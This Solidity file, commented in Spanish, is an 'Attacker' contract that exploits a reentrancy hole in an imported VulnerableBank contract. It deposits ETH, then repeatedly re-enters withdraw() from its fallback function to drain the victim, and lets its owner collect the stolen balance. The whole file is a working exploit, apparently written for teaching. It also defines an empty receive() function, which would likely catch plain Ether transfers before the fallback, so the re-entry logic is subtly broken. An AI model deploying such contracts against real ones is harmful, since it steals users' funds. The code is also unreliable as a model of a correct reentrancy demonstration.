// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Importamos la interfaz del contrato vulnerable
import "./VulnerableBank.sol";

/**
 * @title Attacker
 * @dev Contrato malicioso para explotar la vulnerabilidad de reentrancy
 */
contract Attacker {
    VulnerableBank public vulnerable; // Dirección del contrato víctima
    address public owner; // Dirección del atacante

    constructor(address _vulnerableAddr) {
        vulnerable = VulnerableBank(_vulnerableAddr);
        owner = msg.sender;
    }

    /**
     * @dev Fallback que se ejecuta cuando el contrato recibe Ether.
     *      Aquí es donde ocurre la reentrancy: se vuelve a llamar a withdraw().
     */
    fallback() external payable {
        // Si todavía hay fondos en el contrato víctima, seguimos drenando
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(); // Llamada recursiva
        }
    }

    /**
     * @dev Inicia el ataque depositando algo de ETH
     *      y luego llamando a withdraw() para explotar la vulnerabilidad
     */
    function attack() public payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ETH to attack");

        // 1. Deposita en el contrato vulnerable
        vulnerable.deposit{value: msg.value}();

        // 2. Llama a withdraw(), desencadenando la reentrancy
        vulnerable.withdraw();
    }

    /**
     * @dev Permite al atacante retirar los fondos robados
     */
    function collect() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

